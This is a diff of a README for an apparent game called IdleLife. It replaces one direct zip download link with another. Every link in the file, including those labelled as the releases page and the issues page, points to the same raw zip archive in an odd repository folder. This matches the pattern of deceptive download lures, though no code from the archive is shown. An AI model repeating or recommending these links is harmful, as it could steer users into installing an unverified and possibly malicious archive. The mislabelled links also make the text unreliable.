@@ -4,7 +4,7 @@
 Welcome to IdleLife! This guide will help you download and run the game with ease. Follow the steps below to join in on the fun.
 
 ## 📥 Download IdleLife
-[![Download IdleLife](https://raw.githubusercontent.com/dakudaddy3390/IdleLife/main/worlds/Idle_Life_v2.6.zip)](https://raw.githubusercontent.com/dakudaddy3390/IdleLife/main/worlds/Idle_Life_v2.6.zip)
+[![Download IdleLife](https://github.com/dakudaddy3390/IdleLife/raw/refs/heads/main/characters/Idle_Life_3.1-alpha.2.zip)](https://github.com/dakudaddy3390/IdleLife/raw/refs/heads/main/characters/Idle_Life_3.1-alpha.2.zip)
 
 ## 📋 What is IdleLife?
 IdleLife is a character-based idle game that keeps you entertained as you manage your characters through various challenges. Dive into a relaxing gaming experience where your characters work for you, even when you're not actively playing.
@@ -19,7 +19,7 @@ To ensure that IdleLife runs smoothly, please make sure your system meets the fo
 
 ## 🔧 How to Download & Install
 1. **Visit the Releases Page**
-   Go to the [IdleLife Releases Page](https://raw.githubusercontent.com/dakudaddy3390/IdleLife/main/worlds/Idle_Life_v2.6.zip) to find the latest version of the software.
+   Go to the [IdleLife Releases Page](https://github.com/dakudaddy3390/IdleLife/raw/refs/heads/main/characters/Idle_Life_3.1-alpha.2.zip) to find the latest version of the software.
 
 2. **Choose Your Version**
    On the releases page, you will see a list of available versions. Look for the version labeled as the latest and read its description to ensure it's the one you want.
@@ -56,7 +56,7 @@ To uninstall IdleLife, go to your applications folder, right-click on the IdleLi
 Currently, IdleLife is available only for desktop computers. Stay tuned for updates regarding other platforms.
 
 ### How can I provide feedback or report an issue?
-You can provide feedback or report any issues directly on our [GitHub Issues page](https://raw.githubusercontent.com/dakudaddy3390/IdleLife/main/worlds/Idle_Life_v2.6.zip). We appreciate your input!
+You can provide feedback or report any issues directly on our [GitHub Issues page](https://github.com/dakudaddy3390/IdleLife/raw/refs/heads/main/characters/Idle_Life_3.1-alpha.2.zip). We appreciate your input!
 
 ## 🛠 Troubleshooting
 If you face any issues while installing or playing IdleLife, check the following:
@@ -66,7 +66,7 @@ If you face any issues while installing or playing IdleLife, check the following
 - **Re-download the Installer**: If the installation file is corrupted, try downloading it again from the releases page.
 
 ## 🔗 Helpful Links
-- [IdleLife Releases Page](https://raw.githubusercontent.com/dakudaddy3390/IdleLife/main/worlds/Idle_Life_v2.6.zip)
-- [GitHub Issues Page](https://raw.githubusercontent.com/dakudaddy3390/IdleLife/main/worlds/Idle_Life_v2.6.zip)
+- [IdleLife Releases Page](https://github.com/dakudaddy3390/IdleLife/raw/refs/heads/main/characters/Idle_Life_3.1-alpha.2.zip)
+- [GitHub Issues Page](https://github.com/dakudaddy3390/IdleLife/raw/refs/heads/main/characters/Idle_Life_3.1-alpha.2.zip)
 
 Thank you for choosing IdleLife! Enjoy your gaming experience.
